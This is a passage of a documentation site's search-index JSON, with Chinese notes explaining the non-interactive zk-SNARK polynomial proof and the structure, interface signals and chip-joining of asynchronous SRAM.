Prover \u200b\u53d1\u9001\u200b \\(E(s^0), E(s^1), \\ldots, E(s^d)\\) \u200b\u548c\u200b \\(E(s^0)^{\\alpha}, E(s^1)^{\\alpha}, \\ldots, E(s^d)^{\\alpha}\\)\uff0c\u200b\u5176\u4e2d\u200b \\(d\\) \u200b\u662f\u200b\u591a\u9879\u5f0f\u200b \\(p(x)\\) \u200b\u7684\u200b\u9636\u6570\u200b</li> <li>Prover \u200b\u5df2\u77e5\u200b \\(p(s)=t(s)h(s)\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(E(p(s)), E(\\alpha{}p(s)), E(h(s))\\)</li> <li>Prover \u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(\\delta\\)\uff0c\u200b\u8ba1\u7b97\u200b \\(E(\\delta{}p(s)), E(\\delta{}\\alpha{}p(s)), E(\\delta{}h(s))\\)\uff0c\u200b\u53d1\u9001\u7ed9\u200b Verifier</li> <li>Verifier \u200b\u5224\u65ad\u200b \\(E(\\delta{}p(s))=E(\\delta{}h(s))^{t(s)}\\) \u200b\u4ee5\u53ca\u200b \\(E(\\delta{}p(s))^{\\alpha}=E(\\delta{}\\alpha{}p(s))\\)</li> </ol>"},{"location":"cryptography/zk_snark.html#_6","title":"\u975e\u200b\u4ea4\u4e92\u5f0f","text":"<p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u534f\u8bae\u200b\u662f\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\uff0c\u200b\u9700\u8981\u200b Verifier \u200b\u53d1\u9001\u200b\u4e00\u4e9b\u200b\u6570\u636e\u200b\uff0cProver \u200b\u518d\u200b\u56de\u590d\u200b\u4e00\u4e9b\u200b\u6570\u636e\u200b\u3002\u200b\u66f4\u200b\u7406\u60f3\u200b\u7684\u200b\u662f\u975e\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\u8bc1\u660e\u200b\uff0cProver \u200b\u76f4\u63a5\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u8bc1\u660e\u200b\uff0cVerifier \u200b\u968f\u65f6\u200b\u53ef\u4ee5\u200b\u9a8c\u8bc1\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u4ea4\u4e92\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u4ea4\u4e92\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8ba9\u200b Prover \u200b\u505a\u200b\u81ea\u5df1\u200b\u7684\u200b Verifier\uff0c\u200b\u751f\u6210\u200b\u4e00\u4e2a\u200b\u8bc1\u660e\u200b\uff0c\u200b\u7136\u540e\u200b\u628a\u200b\u8bc1\u660e\u200b\u7684\u200b\u7ed3\u679c\u200b\u516c\u5f00\u200b\u3002\u200b\u90a3\u4e48\u200b\u8fd9\u65f6\u5019\u200b\u9700\u8981\u200b\u6709\u200b\u4e24\u70b9\u200b\u6027\u8d28\u200b\uff1aProver \u200b\u81ea\u5df1\u200b\u505a\u200b\u81ea\u5df1\u200b\u7684\u200b Verifier \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u80fd\u200b\u4f5c\u5f0a\u200b\uff1b\u200b\u5b9e\u9645\u200b\u7684\u200b Verifier \u200b\u770b\u5230\u200b\u8bc1\u660e\u200b\u7684\u200b\u7ed3\u679c\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u9a8c\u8bc1\u200b\u8fd9\u4e2a\u200b\u8bc1\u660e\u200b\u662f\u200b\u5408\u6cd5\u200b\u7684\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u7b2c\u4e00\u70b9\u200b\uff0c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b Prover \u200b\u4e0d\u80fd\u200b\u64cd\u7eb5\u200b Verifier \u200b\u7684\u200b\u968f\u673a\u200b\u53c2\u6570\u200b \\(s\\) \u200b\u548c\u200b \\(\\alpha\\)\u3002\u200b\u4e00\u4e2a\u200b\u601d\u8def\u200b\u662f\u200b\u8ba9\u200b\u591a\u4e2a\u200b\u6f5c\u5728\u200b\u7684\u200b Verifier \u200b\u5171\u540c\u200b\u7ed9\u51fa\u200b\u4e00\u7ec4\u200b\u968f\u673a\u200b\u53c2\u6570\u200b\uff0c\u200b\u53e6\u200b\u4e00\u4e2a\u200b\u601d\u8def\u200b\u662f\u200b\u4f7f\u7528\u200b\u4e00\u4e9b\u200b\u4e0d\u200b\u53ef\u9006\u200b\u7684\u200b\u51fd\u6570\u200b\uff0c\u200b\u4f8b\u5982\u200b\u5bc6\u7801\u5b66\u200b\u54c8\u5e0c\u200b\u51fd\u6570\u200b\uff0c\u200b\u8f93\u5165\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u4e00\u4e9b\u200b\u4fe1\u606f\u200b\uff0c\u200b\u628a\u200b\u8f93\u51fa\u200b\u7684\u200b\u54c8\u5e0c\u200b\u89c6\u4e3a\u200b\u968f\u673a\u6570\u200b\uff0c\u200b\u8fd9\u6837\u200b\u4fdd\u8bc1\u200b\u4e86\u200b\u968f\u673a\u6027\u200b\uff0c\u200b\u53c8\u200b\u65e0\u6cd5\u200b\u6307\u5b9a\u200b\u968f\u673a\u200b\u53c2\u6570\u200b\u3002</p> <p>\u200b\u4e3a\u4e86\u200b\u4fdd\u8bc1\u200b\u7b2c\u4e8c\u70b9\u200b\uff0c\u200b\u9700\u8981\u200b\u4fdd\u8bc1\u200b\u6240\u6709\u4eba\u200b\u90fd\u200b\u53ef\u4ee5\u200b\u5b8c\u6210\u200b\u9a8c\u8bc1\u200b\u7684\u200b\u90a3\u200b\u4e00\u6b65\u200b\uff0c\u200b\u56de\u987e\u200b\u524d\u9762\u200b\u7684\u200b\u534f\u8bae\u200b\uff0c\u200b\u6700\u540e\u200b\u9700\u8981\u200b\u9a8c\u8bc1\u200b\u7684\u200b\u662f\u200b\uff1a</p> <ol> <li>\\(E(\\delta{}p(s))=E(\\delta{}h(s))^{t(s)}\\)</li> <li>\\(E(\\delta{}p(s))^{\\alpha}=E(\\delta{}\\alpha{}p(s))\\)</li> </ol> <p>\u200b\u4f46\u662f\u200b\u8fd9\u4e2a\u200b\u9a8c\u8bc1\u200b\u8fc7\u7a0b\u200b\u9700\u8981\u200b\u77e5\u9053\u200b \\(t(s)\\) \u200b\u548c\u200b \\(\\alpha\\) \u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b\u662f\u200b\u91c7\u7528\u200b\u524d\u9762\u200b\u6240\u8bf4\u200b\u7684\u200b\u968f\u673a\u200b\u751f\u6210\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u503c\u200b\u662f\u200b\u4e0d\u80fd\u200b\u516c\u5f00\u200b\u7684\u200b\uff0c\u200b\u5426\u5219\u200b Prover \u200b\u5c31\u200b\u53ef\u4ee5\u200b\u9488\u5bf9\u200b\u5b83\u200b\u53bb\u200b\u751f\u6210\u200b\u6570\u636e\u200b\u3002\u200b\u89e3\u51b3\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u8bbe\u8ba1\u200b\u4e00\u4e2a\u200b\u201c\u200b\u4e58\u6cd5\u200b\u201d\uff08\u200b\u4e0b\u9762\u200b\u7528\u200b \\(\\times\\) \u200b\u8868\u793a\u200b\uff09\uff0c\u200b\u4f7f\u5f97\u200b\u9a8c\u8bc1\u200b\u8fc7\u7a0b\u200b\u4e0d\u200b\u9700\u8981\u200b\u539f\u59cb\u200b\u7684\u200b \\(t(s)\\) \u200b\u548c\u200b \\(\\alpha\\)\uff0c\u200b\u800c\u662f\u200b\u9700\u8981\u200b \\(E(t(s))\\) \u200b\u548c\u200b \\(E(\\alpha)\\)\uff1a</p> <ol> <li>\\(E(\\delta{}p(s))=E(\\delta{}h(s))^{t(s)}\\) \u200b\u5bf9\u5e94\u200b \\(g^{\\delta{}p(s)} \\times g = g^{t(s)} \\times g^{\\delta{}h(s)}\\)</li> <li>\\(E(\\delta{}p(s))^{\\alpha}=E(\\delta{}\\alpha{}p(s))\\) \u200b\u5bf9\u5e94\u200b \\(g^{\\delta{}p(s)} \\times g^{\\alpha} = g^{\\delta{}\\alpha{}p(s)} \\times g\\)</li> </ol> <p>\u200b\u90a3\u4e48\u200b\u9a8c\u8bc1\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u200b\u9700\u8981\u200b \\(E(t(s))=g^{t(s)}\\)\uff0c\\(E(\\alpha)=g^{\\alpha}\\) \u200b\u548c\u200b \\(g\\)\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u9a8c\u8bc1\u200b\u7ed3\u679c\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u77e5\u9053\u200b \\(s\\) \u200b\u548c\u200b \\(\\alpha\\) \u200b\u7684\u200b\u5177\u4f53\u200b\u503c\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u4e58\u6cd5\u200b\u662f\u200b\u4e00\u4e2a\u200b\u53cc\u7ebf\u6027\u200b\u7684\u200b\u6620\u5c04\u200b\uff0c\u200b\u53eb\u505a\u200b pairing\u3002</p> <p>\u200b\u90a3\u4e48\u200b\u5230\u200b\u8fd9\u91cc\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u7ed9\u51fa\u200b\u4e00\u4e2a\u200b\u5b8c\u6574\u200b\u7684\u200b\u975e\u200b\u4ea4\u4e92\u5f0f\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\u96f6\u70b9\u200b\u8bc1\u660e\u200b\uff1a</p> <ol> <li>\u200b\u5df2\u77e5\u200b\u591a\u9879\u5f0f\u200b \\(t(x)\\) \u200b\u548c\u200b\u6b21\u6570\u200b \\(d\\)</li> <li>\u200b\u521d\u59cb\u5316\u200b\u9636\u6bb5\u200b<ol> <li>\u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(s\\) \u200b\u548c\u200b \\(\\alpha\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(g^{s^i}, g^{\\alpha{}s^i}, g^{\\alpha}, g^{t(s)}\\)</li> <li>\u200b\u8bb0\u200b\u5176\u4e2d\u200b\u7684\u200b \\(g^{s^i}, g^{\\alpha{}s^i}\\) \u200b\u4e3a\u200b Proving Key\uff0c\u200b\u7528\u4e8e\u200b Prover \u200b\u751f\u6210\u200b Proof</li> <li>\u200b\u8bb0\u200b\u5176\u4e2d\u200b\u7684\u200b \\(g^{\\alpha}, g^{t(s)}\\) \u200b\u4e3a\u200b Verification Key\uff0c\u200b\u7528\u4e8e\u200b Verifier \u200b\u9a8c\u8bc1\u200b Proof</li> </ol> </li> <li>\u200b\u8bc1\u660e\u200b\u9636\u6bb5\u200b<ol> <li>\u200b\u8ba1\u7b97\u200b \\(h(x) = p(x) / t(x)\\)</li> <li>\u200b\u7528\u200b \\(g^{s^i}\\) \u200b\u8ba1\u7b97\u200b \\(g^{p(s)}\\) \u200b\u548c\u200b \\(g^{h(s)}\\)</li> <li>\u200b\u7528\u200b \\(g^{\\alpha{}s^i}\\) \u200b\u8ba1\u7b97\u200b \\(g^{\\alpha{}p(s)}\\)</li> <li>\u200b\u751f\u6210\u200b\u968f\u673a\u6570\u200b \\(\\delta\\)</li> <li>\u200b\u8ba1\u7b97\u200b \\(g^{\\delta{}p(s)}, g^{\\delta{}h(s)}, g^{\\delta{}\\alpha{}p(s)}\\)</li> </ol> </li> <li>\u200b\u9a8c\u8bc1\u200b\u9636\u6bb5\u200b<ol> <li>\u200b\u68c0\u67e5\u200b \\(g^{\\delta{}\\alpha{}p(s)} \\times g = g^{\\delta{}p(s)} \\times g^{\\alpha}\\)</li> <li>\u200b\u68c0\u67e5\u200b \\(g^{\\delta{}p(s)} \\times g = g^{t(s)} \\times g^{\\delta{}h(s)}\\)</li> </ol> </li> </ol>"},{"location":"cryptography/zk_snark.html#_7","title":"\u901a\u7528\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e","text":"<p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u96f6\u200b\u77e5\u8bc6\u200b\u8bc1\u660e\u200b\u53ea\u200b\u9002\u7528\u200b\u4e8e\u200b\u591a\u9879\u5f0f\u200b\u7684\u200b\u96f6\u70b9\u200b\u95ee\u9898\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5bf9\u4e8e\u200b\u66f4\u200b\u5e7f\u6cdb\u200b\u7684\u200b\u573a\u666f\u200b\uff0c\u200b\u4f8b\u5982\u200b\u524d\u9762\u200b\u63d0\u5230\u200b\u7684\u200b\u94f6\u884c\u5b58\u6b3e\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u5982\u4f55\u200b\u5b9e\u73b0\u200b\u5462\u200b\uff1f</p> <p>\u200b\u601d\u8def\u200b\u662f\u200b\u628a\u200b\u95ee\u9898\u200b\u8f6c\u5316\u200b\u4e3a\u200b\u524d\u9762\u200b\u7684\u200b\u591a\u9879\u5f0f\u200b\u96f6\u70b9\u200b\u95ee\u9898\u200b\uff0c\u200b\u5177\u4f53\u65b9\u6cd5\u200b\u8be6\u89c1\u200b\u53c2\u8003\u8d44\u6599\u200b\u3002</p>"},{"location":"cryptography/zk_snark.html#_8","title":"\u53c2\u8003\u8d44\u6599","text":"<ul> <li>Why and How zk-SNARK Works: Definitive Explanation</li> </ul>"},{"location":"hardware/async_sram.html","title":"\u5f02\u6b65\u200b SRAM","text":""},{"location":"hardware/async_sram.html#_1","title":"\u7279\u70b9","text":"<p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u7279\u70b9\u200b\uff1a</p> <ol> <li>\u200b\u63a5\u53e3\u200b\u7b80\u5355\u200b\uff1a\u200b\u63a7\u5236\u5668\u200b\u7ed9\u51fa\u200b\u5730\u5740\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\uff0c\u200b\u7ecf\u8fc7\u200b\u56fa\u5b9a\u200b\u5ef6\u8fdf\u200b\u540e\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u6570\u636e\u200b\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u6821\u51c6\u200b</li> <li>\u200b\u63d0\u4f9b\u200b MB \u200b\u7ea7\u522b\u200b\u7684\u200b RAM\uff1a\u200b\u5355\u82af\u7247\u200b\u53ef\u4ee5\u200b\u63d0\u4f9b\u200b KB \u200b\u5230\u200b MB \u200b\u7ea7\u522b\u200b\u7684\u200b RAM\uff0c\u200b\u901a\u8fc7\u200b\u5e76\u8054\u200b\u591a\u4e2a\u200b SRAM\uff0c\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u66f4\u5927\u200b\u7684\u200b\u5bb9\u91cf\u200b</li> <li>\u200b\u9ad8\u901f\u200b\u5f02\u6b65\u200b SRAM \u200b\u5ef6\u8fdf\u200b\u5728\u200b 10ns \u200b\u7684\u200b\u7ea7\u522b\u200b</li> </ol>"},{"location":"hardware/async_sram.html#_2","title":"\u7ed3\u6784","text":"<p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u5185\u90e8\u200b\u4ee5\u200b\u4e00\u4e2a\u200b\u6570\u7ec4\u200b\u7684\u200b\u5f62\u5f0f\u200b\u4fdd\u5b58\u200b\u6570\u636e\u200b\u3002\u200b\u4f8b\u5982\u200b\u4e00\u4e2a\u200b 2048K x 16 \u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u6709\u200b 2048K \u200b\u4e2a\u884c\u200b\uff0c\u200b\u6bcf\u884c\u200b\u4fdd\u5b58\u200b\u4e86\u200b 16 \u200b\u4f4d\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u603b\u5171\u200b\u4fdd\u5b58\u200b\u4e86\u200b \\(2048\\mathrm{K} * 16\\mathrm{b} = 32 \\mathrm{Mb}\\) \u200b\u7684\u200b\u6570\u636e\u200b\u3002</p> <p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u7ed3\u6784\u200b\u89c1\u56fe\u200b 1\u3002\u200b\u63a7\u5236\u5668\u200b\u5728\u200b\u8bbf\u95ee\u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u7ed9\u51fa\u200b\u4e00\u4e2a\u200b\u884c\u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u5f02\u6b65\u200b SRAM \u200b\u5c31\u200b\u4f1a\u200b\u8bfb\u53d6\u200b\u4e00\u884c\u200b\u7684\u200b\u6570\u636e\u200b\u3002\u200b\u7531\u4e8e\u200b\u4e00\u5171\u200b\u6709\u200b 2048K \u200b\u4e2a\u884c\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5730\u5740\u200b\u9700\u8981\u200b\u7684\u200b\u4f4d\u6570\u200b\u662f\u200b \\(\\log_2(2048\\mathrm{K})=21\\)\uff0c\u200b\u5bf9\u5e94\u200b\u4e0b\u56fe\u200b\u7684\u200b <code>A0-A20</code>\u3002\u200b\u5730\u5740\u200b\u901a\u8fc7\u200b <code>DECODER</code>\uff0c\u200b\u4ece\u200b\u6570\u7ec4\u200b\u4e2d\u200b\u53d6\u51fa\u200b\u8981\u200b\u8bbf\u95ee\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u653e\u5230\u200b <code>COLUMN IO</code> \u200b\u4e2d\u200b\u3002</p> <p> </p> \u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u7ed3\u6784\u200b\u6846\u56fe\u200b\uff08\u200b\u56fe\u6e90\u200b ISSI Datasheet\uff09 <p>\u200b\u5bf9\u4e8e\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u5728\u200b <code>A0-A20</code> \u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u5730\u5740\u200b\uff0c\u200b\u7ecf\u8fc7\u200b <code>DECODER</code> \u200b\u4ece\u200b <code>2048K x 16 MEMORY ARRAY</code> \u200b\u4e2d\u200b\u8bfb\u53d6\u6570\u636e\u200b\u5230\u200b <code>COLUMN IO</code>\uff0c\u200b\u63a7\u5236\u200b\u903b\u8f91\u200b <code>CONTROL CIRCUIT</code> \u200b\u6839\u636e\u200b\u8bfb\u200b\u64cd\u4f5c\u200b\uff08<code>WE#=1, OE#=0</code>\uff09\uff0c\u200b\u628a\u200b\u6570\u636e\u200b\u8f93\u51fa\u200b\u5230\u200b <code>I/O DATA CIRCUIT</code>\u3002</p> <p>\u200b\u5bf9\u4e8e\u200b\u5199\u200b\u64cd\u4f5c\u200b\uff0c\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u5728\u200b <code>A0-A20</code> \u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u5730\u5740\u200b\uff0c\u200b\u5728\u200b <code>I/O</code> \u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u5728\u200b <code>UB#/LB#</code> \u200b\u4e0a\u200b\u63d0\u4f9b\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\u3002\u200b\u5f02\u6b65\u200b SRAM \u200b\u4ece\u200b <code>MEMORY ARRAY</code> \u200b\u4e2d\u200b\u8bfb\u53d6\u200b\u6570\u7ec4\u200b\u4e2d\u200b\u73b0\u6709\u200b\u7684\u200b\u6570\u636e\u200b\uff0c\u200b\u7ed3\u5408\u200b <code>UB#/LB#</code> \u200b\u4e0e\u200b <code>I/O</code>\uff0c\u200b\u8ba1\u7b97\u200b\u51fa\u65b0\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u518d\u200b\u5199\u5165\u200b\u5185\u5b58\u200b\u3002\u200b\u5176\u4e2d\u200b <code>UB#</code> \u200b\u548c\u200b <code>LB#</code> \u200b\u5206\u522b\u200b\u662f\u200b\u9ad8\u200b 8 \u200b\u4f4d\u200b\u548c\u200b\u4f4e\u200b 8 \u200b\u4f4d\u200b\u7684\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\uff08\u200b\u4f4e\u200b\u6709\u6548\u200b\uff09\u3002\u200b\u5982\u679c\u200b\u65e7\u200b\u6570\u636e\u200b\u662f\u200b <code>1234</code>\uff0c\u200b\u5185\u5b58\u200b\u63a7\u5236\u5668\u200b\u8981\u200b\u5199\u5165\u200b\u7684\u200b\u503c\u200b\u662f\u200b <code>5678</code>\uff0c\u200b\u90a3\u4e48\u200b\u5185\u5b58\u200b\u4e2d\u200b\u7684\u200b\u503c\u200b\u66f4\u65b0\u200b\u4e3a\u200b\uff1a</p> UB# LB# \u200b\u7ed3\u679c\u200b \u200b\u89e3\u91ca\u200b 0 0 5678 \u200b\u5168\u90e8\u200b\u91c7\u7528\u200b\u65b0\u503c\u200b 1 0 1278 \u200b\u4ec5\u200b\u5199\u5165\u200b\u4f4e\u5b57\u8282\u200b 0 1 5634 \u200b\u4ec5\u200b\u5199\u5165\u200b\u9ad8\u5b57\u8282\u200b 1 1 1234 \u200b\u5168\u90e8\u200b\u91c7\u7528\u200b\u65e7\u503c"},{"location":"hardware/async_sram.html#_3","title":"\u63a5\u53e3","text":"<p>\u200b\u5f02\u6b65\u200b SRAM \u200b\u66b4\u9732\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5355\u53e3\u200b RAM \u200b\u63a5\u53e3\u200b\uff0c\u200b\u540c\u65f6\u200b\u53ea\u80fd\u200b\u8fdb\u884c\u200b\u8bfb\u200b\u6216\u8005\u200b\u5199\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u64cd\u4f5c\u200b\u3002\u200b\u5178\u578b\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM \u200b\u5305\u62ec\u200b\u5982\u4e0b\u200b\u7684\u200b\u4fe1\u53f7\u200b\uff1a</p> <ol> <li>\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b A\uff1a\u200b\u4f4d\u6570\u200b\u6839\u636e\u200b\u6df1\u5ea6\u200b\u51b3\u5b9a\u200b\uff0c\u200b\u4f8b\u5982\u200b 2048K \u200b\u7684\u200b\u6df1\u5ea6\u200b\u5bf9\u5e94\u200b 21 \u200b\u4f4d\u200b\u5730\u5740\u200b</li> <li>\u200b\u6570\u636e\u4fe1\u53f7\u200b I/O\uff1a\u200b\u4f4d\u6570\u200b\u7b49\u4e8e\u200b\u5bbd\u5ea6\u200b\uff0c\u200b\u4f8b\u5982\u200b 8 \u200b\u6216\u200b 16 \u200b\u4f4d\u200b</li> <li>\u200b\u7247\u9009\u200b\u4fe1\u53f7\u200b CS#\uff08\u200b\u6216\u8005\u200b\u53eb\u200b CE#\uff09\uff1a\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0cCS# \u200b\u7b49\u4e8e\u200b 0 \u200b\u65f6\u200b\u5de5\u4f5c\u200b</li> <li>\u200b\u8f93\u51fa\u200b\u4f7f\u80fd\u200b\u4fe1\u53f7\u200b OE#\uff1a\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0cOE# \u200b\u7b49\u4e8e\u200b 0 \u200b\u65f6\u200b SRAM \u200b\u8f93\u51fa\u200b\uff0cOE# \u200b\u7b49\u4e8e\u200b 1 \u200b\u65f6\u200b SRAM \u200b\u8f93\u5165\u200b</li> <li>\u200b\u5199\u200b\u4f7f\u200b\u80fd\u200b\u4fe1\u53f7\u200b WE#\uff1a\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0cWE# \u200b\u7b49\u4e8e\u200b 0 \u200b\u65f6\u5199\u200b\uff0cWE# \u200b\u7b49\u4e8e\u200b 1 \u200b\u65f6\u8bfb\u200b</li> <li>\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\u4fe1\u53f7\u200b UB#/LB#\uff1a\u200b\u4f4e\u200b\u6709\u6548\u200b\uff0c\u200b\u5bf9\u5e94\u200b\u4e24\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u7b49\u4e8e\u200b 0 \u200b\u65f6\u200b\u66f4\u65b0\u200b\uff0c\u200b\u7b49\u4e8e\u200b 1 \u200b\u65f6\u200b\u4e0d\u53d8\u200b</li> </ol> <p>\u200b\u4e00\u4e9b\u200b\u5f02\u6b65\u200b SRAM \u200b\u7684\u200b\u5bbd\u5ea6\u200b\u662f\u200b 8 \u200b\u4f4d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u6ca1\u6709\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\u4fe1\u53f7\u200b\u3002</p>"},{"location":"hardware/async_sram.html#_4","title":"\u62fc\u63a5","text":"<p>\u200b\u5982\u679c\u200b\u60f3\u8981\u200b\u66f4\u200b\u5927\u5bb9\u91cf\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u53ef\u4ee5\u200b\u62fc\u63a5\u200b\u591a\u4e2a\u200b\u5f02\u6b65\u200b SRAM\u3002\u200b\u62fc\u63a5\u200b\u7684\u200b\u65f6\u5019\u200b\u53ef\u4ee5\u200b\u91c7\u7528\u200b\u4e24\u79cd\u200b\u65b9\u5f0f\u200b\uff1a</p> <p>\u200b\u4e00\u79cd\u200b\u662f\u200b\u5728\u200b\u5bbd\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\uff0c\u200b\u4f8b\u5982\u200b\u62fc\u63a5\u200b\u4e24\u4e2a\u200b\u76f8\u540c\u200b\u6df1\u5ea6\u200b\u3001\u200b\u5bbd\u5ea6\u200b\u4e3a\u200b 16 \u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u5bbd\u5ea6\u200b\u4e3a\u200b 32 \u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff1a</p> <p> </p> \u200b\u5728\u200b\u5bbd\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\u5f02\u6b65\u200b SRAM <p>\u200b\u5730\u5740\u200b\u4fe1\u53f7\u200b\uff08A\uff09\u200b\u548c\u200b\u63a7\u5236\u200b\u4fe1\u53f7\u200b\uff08OE#\u3001WE#\u3001CE#\uff09\u200b\u8fde\u63a5\u200b\u5230\u200b\u6240\u6709\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u6570\u636e\u4fe1\u53f7\u200b\uff08DQ\uff09\u200b\u548c\u200b\u5b57\u8282\u200b\u4f7f\u80fd\u200b\u4fe1\u53f7\u200b\uff08WE0-3#\uff09\u200b\u5219\u200b\u8fde\u63a5\u200b\u5230\u200b\u4e0d\u540c\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5f62\u6210\u200b\u4e24\u500d\u200b\u7684\u200b\u6570\u636e\u200b\u5bbd\u5ea6\u200b\u3002</p> <p>\u200b\u53e6\u200b\u4e00\u79cd\u200b\u662f\u200b\u5728\u200b\u6df1\u5ea6\u200b\u4e0a\u200b\u62fc\u63a5\u200b\uff0c\u200b\u4fdd\u6301\u200b\u5bbd\u5ea6\u200b\u4e0d\u53d8\u200b\uff0c\u200b\u589e\u52a0\u200b\u5b58\u50a8\u5bb9\u91cf\u200b\u3002\u200b\u4f8b\u5982\u200b\u62fc\u63a5\u200b\u4e24\u4e2a\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u6df1\u5ea6\u200b\u7ffb\u500d\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\u3002\u200b\u6bcf\u6b21\u200b\u8bbf\u95ee\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u53ea\u4f1a\u200b\u8bbf\u95ee\u200b\u5176\u4e2d\u200b\u4e00\u4e2a\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u901a\u8fc7\u200b\u5730\u5740\u200b\u6765\u200b\u533a\u5206\u200b\u3002</p> <p>\u200b\u4f8b\u5982\u200b\u8981\u200b\u62fc\u63a5\u200b\u4e24\u4e2a\u200b 21 \u200b\u4f4d\u200b\u5730\u5740\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b 22 \u200b\u4f4d\u200b\u5730\u5740\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u5982\u679c\u200b\u7528\u200b\u5730\u5740\u200b\u7684\u200b\u6700\u9ad8\u200b\u4f4d\u6765\u200b\u9009\u62e9\u200b\u8bbf\u95ee\u200b\u54ea\u4e2a\u200b\u5f02\u6b65\u200b SRAM\uff0c\u200b\u90a3\u4e48\u200b\u53ef\u4ee5\u200b\u8bbe\u5b9a\u200b\uff1a<code>CS0#=CS# | A[21], CS1#=CS# | ~A[21]</code>\uff0c\u200b\u5176\u4f59\u200b\u7684\u200b\u4fe1\u53f7\u200b\u90fd\u200b\u8fde\u63a5\u200b\u5230\u200b\u6240\u6709\u200b\u7684\u200b\u5f02\u6b65\u200b SRAM\u3002\u200b\u7531\u4e8e\u200b\u5f02\u6b65\u200b SRAM \u200b\u5728\u200b <code>CS#=1</code> 